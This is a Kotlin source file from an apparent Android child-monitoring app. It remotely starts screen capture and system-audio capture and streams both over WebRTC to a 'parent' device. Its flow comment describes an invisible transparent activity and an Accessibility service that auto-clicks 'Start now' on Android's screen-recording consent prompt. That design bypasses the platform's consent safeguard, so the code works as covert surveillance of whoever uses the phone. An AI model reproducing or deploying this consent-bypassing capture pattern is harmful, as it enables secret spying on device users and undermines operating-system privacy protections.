package nexus.android.child.components.screen

import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.util.Log
import org.webrtc.*

/**
 * ScreenRecordingController - Manages screen capture and system audio streaming
 * 
 * ARCHITECTURE:
 * - Screen video: MediaProjection → WebRTC VideoTrack → Parent
 * - System audio: AudioPlaybackCapture → Opus encode → DataChannel → Parent
 * 
 * WHY DATACHANNEL FOR AUDIO:
 * - No WebRTC audio track mixing complexity
 * - Better audio quality (direct Opus encoding, no WebRTC processing)
 * - Lower latency (DataChannel faster than RTP for small packets)
 * - Simpler parent-side handling (one video track + audio via DataChannel)
 * - Full control over encoding parameters
 * 
 * SYSTEM AUDIO CAPTURE (Android 10+):
 * - Uses AudioPlaybackCaptureConfiguration
 * - Captures USAGE_MEDIA, USAGE_GAME, USAGE_UNKNOWN
 * - Cannot capture DRM-protected content or voice calls
 * - Apps can opt-out with ALLOW_CAPTURE_BY_NONE policy
 * 
 * AUDIO PIPELINE:
 * 1. SystemAudioCapturer: Captures PCM audio (48kHz Mono, 20ms frames)
 * 2. OpusEncoder: Encodes PCM to Opus (32kbps)
 * 3. DataChannel: Sends Opus packets to parent
 * 4. Parent: Decodes Opus and plays audio
 * 
 * FLOW:
 * 1. SCREEN_RECORDING_ON command received
 * 2. Launch TransparentMediaProjectionActivity
 * 3. Activity requests MediaProjection permission
 * 4. Accessibility auto-clicks "Start now"
 * 5. Activity returns result intent to service
 * 6. Service calls startScreenRecording() with intent
 * 7. Create video track and add to PeerConnection
 * 8. Start system audio capture (if Android 10+)
 * 9. Trigger renegotiation (Child becomes Offerer)
 * 10. Send SCREEN_RECORDING_STARTED confirmation
 * 
 * CLEANUP ORDER:
 * 1. Stop system audio capture
 * 2. Stop Opus encoder
 * 3. Disable video track
 * 4. Stop screen capturer
 * 5. Dispose video track
 * 6. Dispose video source
 * 7. Stop MediaProjection
 * 8. Remove track from PeerConnection
 * 9. Trigger renegotiation
 */
class ScreenRecordingController(
    private val context: Context,
    private val factory: PeerConnectionFactory,
    private val pc: PeerConnection?
) {
    private val TAG = "ScreenRecordingCtrl"
    
    // WebRTC components
    private val eglCtx = EglBase.create().eglBaseContext
    private var videoSource: VideoSource? = null
    private var videoTrack: VideoTrack? = null
    private var videoRtpSender: RtpSender? = null
    
    // System audio components (Android 10+)
    private var systemAudioCapturer: SystemAudioCapturer? = null
    private var opusEncoder: OpusEncoder? = null
    
    // MediaProjection components
    // Video: Managed internally by ScreenCapturerAndroid
    // Audio: We need our own MediaProjection instance for SystemAudioCapturer
    private var audioMediaProjection: MediaProjection? = null
    private var screenCapturer: ScreenCapturerAndroid? = null
    
    // DataChannel for audio streaming (set after initialization)
    private var dataChannel: DataChannel? = null
    
    // State tracking
    @Volatile
    private var isActive = false
    
    // Audio packet header for DataChannel
    companion object {
        private const val AUDIO_PACKET_HEADER = "OPUS_AUDIO:"
    }
    
    /**
     * Set DataChannel for system audio streaming
     * Called after DataChannel becomes available in BackgroundService
     */
    fun setDataChannel(channel: DataChannel) {
        this.dataChannel = channel
        Log.d(TAG, "✅ DataChannel set for system audio streaming")
    }
    
    /**
     * Start screen recording with MediaProjection result intent
     * 
     * @param resultCode Result code from MediaProjection permission dialog
     * @param data Intent data containing MediaProjection token
     * @return true if track added successfully (renegotiation needed), false otherwise
     */
    fun startScreenRecording(resultCode: Int, data: Intent): Boolean {
        Log.d(TAG, "🖥️ startScreenRecording() called, isActive=$isActive")
        
        if (isActive) {
            Log.w(TAG, "⚠️ Screen recording already active")
            return false
        }
        
        try {
            // Create MediaProjection for audio capture
            // Note: We need a separate instance for audio because ScreenCapturerAndroid
            // manages its own MediaProjection internally for video
            val mediaProjectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            audioMediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data)
            
            if (audioMediaProjection == null) {
                Log.e(TAG, "❌ Failed to create MediaProjection for audio")
                return false
            }
            
            Log.d(TAG, "✅ MediaProjection created for audio capture")
            
            // Create screen capturer with MediaProjection Intent
            // ScreenCapturerAndroid will create its own MediaProjection internally for video
            val mediaProjectionCallback = object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.w(TAG, "⚠️ MediaProjection stopped by system")
                    stopScreenRecording()
                }
            }
            
            screenCapturer = ScreenCapturerAndroid(data, mediaProjectionCallback)
            
            // Create video source and track
            videoSource = factory.createVideoSource(screenCapturer!!.isScreencast)
            videoTrack = factory.createVideoTrack("SCREEN_TRACK", videoSource)
            
            // Initialize screen capturer with video source
            screenCapturer?.initialize(
                SurfaceTextureHelper.create("ScreenCaptureThread", eglCtx),
                context,
                videoSource?.capturerObserver
            )
            
            // Start capturing at 720p, 30fps (balance between quality and bandwidth)
            screenCapturer?.startCapture(1280, 720, 30)
            
            // Add video track to PeerConnection
            videoRtpSender = pc?.addTrack(videoTrack, listOf("screen-stream"))
            
            if (videoRtpSender == null) {
                Log.e(TAG, "❌ Failed to add screen video track to PeerConnection")
                cleanup()
                return false
            }
            
            // Enable video track
            videoTrack?.setEnabled(true)
            
            // Start system audio capture via DataChannel (Android 10+)
            startSystemAudioCapture()
            
            isActive = true
            Log.d(TAG, "✅ Screen recording started successfully (720p @ 30fps + system audio via DataChannel)")
            
            // Return true to indicate renegotiation is needed
            return true
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start screen recording", e)
            cleanup()
            return false
        }
    }
    
    /**
     * Stop screen recording and cleanup resources
     * 
     * @return true if track removed successfully (renegotiation needed), false otherwise
     */
    fun stopScreenRecording(): Boolean {
        Log.d(TAG, "🛑 stopScreenRecording() called, isActive=$isActive")
        
        if (!isActive) {
            Log.w(TAG, "⚠️ Screen recording not active")
            return false
        }
        
        try {
            // Stop system audio capture first
            systemAudioCapturer?.stopCapture()
            systemAudioCapturer = null
            
            opusEncoder?.stop()
            opusEncoder = null
            
            // Disable video track
            videoTrack?.setEnabled(false)
            
            // Cleanup resources
            cleanup()
            
            // Remove video track from PeerConnection
            if (videoRtpSender != null) {
                pc?.removeTrack(videoRtpSender)
                videoRtpSender = null
            }
            
            isActive = false
            Log.d(TAG, "✅ Screen recording stopped successfully")
            
            // Return true to indicate renegotiation is needed
            return true
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to stop screen recording", e)
            return false
        }
    }
    
    /**
     * Start system audio capture via DataChannel (Android 10+)
     * 
     * ARCHITECTURE:
     * - AudioPlaybackCapture → PCM (48kHz Mono, 20ms frames)
     * - Opus encode → DataChannel packets
     * - Parent receives → Opus decode → Web Audio API playback
     * 
     * WHY DATACHANNEL:
     * - No WebRTC audio track mixing
     * - Better quality (direct Opus control)
     * - Lower latency
     * - Simpler parent handling
     */
    private fun startSystemAudioCapture() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            Log.d(TAG, "ℹ️ System audio capture requires Android 10+, current: ${Build.VERSION.SDK_INT}")
            return
        }
        
        if (dataChannel == null) {
            Log.w(TAG, "⚠️ DataChannel not available, skipping system audio capture")
            return
        }
        
        if (audioMediaProjection == null) {
            Log.w(TAG, "⚠️ MediaProjection not available, skipping system audio capture")
            return
        }
        
        try {
            Log.d(TAG, "🔊 Starting system audio capture via DataChannel")
            Log.d(TAG, "ℹ️ Note: Only captures MEDIA/GAME/UNKNOWN usage audio, not DRM or voice calls")
            
            // Create Opus encoder
            opusEncoder = OpusEncoder()
            if (!opusEncoder!!.start()) {
                Log.e(TAG, "❌ Failed to start Opus encoder")
                opusEncoder = null
                return
            }
            
            // Create system audio capturer
            systemAudioCapturer = SystemAudioCapturer(audioMediaProjection!!)
            val captureStarted = systemAudioCapturer!!.startCapture { pcmData, bytesRead ->
                // Encode PCM to Opus
                val opusData = opusEncoder?.encode(pcmData, bytesRead)
                
                if (opusData != null && opusData.isNotEmpty()) {
                    // Send Opus packet via DataChannel
                    sendOpusPacket(opusData)
                }
            }
            
            if (!captureStarted) {
                Log.e(TAG, "❌ Failed to start system audio capturer")
                opusEncoder?.stop()
                opusEncoder = null
                systemAudioCapturer = null
                return
            }
            
            Log.d(TAG, "✅ System audio capture started (48kHz Mono → Opus → DataChannel)")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to start system audio capture", e)
            opusEncoder?.stop()
            opusEncoder = null
            systemAudioCapturer?.stopCapture()
            systemAudioCapturer = null
        }
    }
    
    /**
     * Send Opus audio packet via DataChannel
     * Format: "OPUS_AUDIO:" + Base64(opus_data)
     */
    private fun sendOpusPacket(opusData: ByteArray) {
        try {
            val channel = dataChannel ?: return
            
            if (channel.state() != DataChannel.State.OPEN) {
                return
            }
            
            // Encode to Base64 for text transmission
            val base64Data = android.util.Base64.encodeToString(opusData, android.util.Base64.NO_WRAP)
            val message = "$AUDIO_PACKET_HEADER$base64Data"
            
            // Send via DataChannel
            val buffer = java.nio.ByteBuffer.wrap(message.toByteArray(Charsets.UTF_8))
            channel.send(DataChannel.Buffer(buffer, false))
            
        } catch (e: Exception) {
            Log.w(TAG, "⚠️ Failed to send Opus packet", e)
        }
    }
    private fun cleanup() {
        try {
            // Stop system audio components
            systemAudioCapturer?.stopCapture()
            systemAudioCapturer = null
            
            opusEncoder?.stop()
            opusEncoder = null
            
            // Stop screen capturer
            screenCapturer?.stopCapture()
            screenCapturer?.dispose()
            screenCapturer = null
            
            // Dispose video track
            videoTrack?.dispose()
            videoTrack = null
            
            // Dispose video source
            videoSource?.dispose()
            videoSource = null
            
            // Stop audio MediaProjection
            audioMediaProjection?.stop()
            audioMediaProjection = null
            
            // Note: Video MediaProjection is managed by ScreenCapturerAndroid
            
            Log.d(TAG, "🧹 Resources cleaned up")
            
        } catch (e: Exception) {
            Log.e(TAG, "⚠️ Error during cleanup", e)
        }
    }
    
    /**
     * Check if screen recording is active
     */
    fun isRecording(): Boolean = isActive
    
    /**
     * Cleanup on service destroy
     */
    fun destroy() {
        if (isActive) {
            stopScreenRecording()
        }
        cleanup()
    }
}
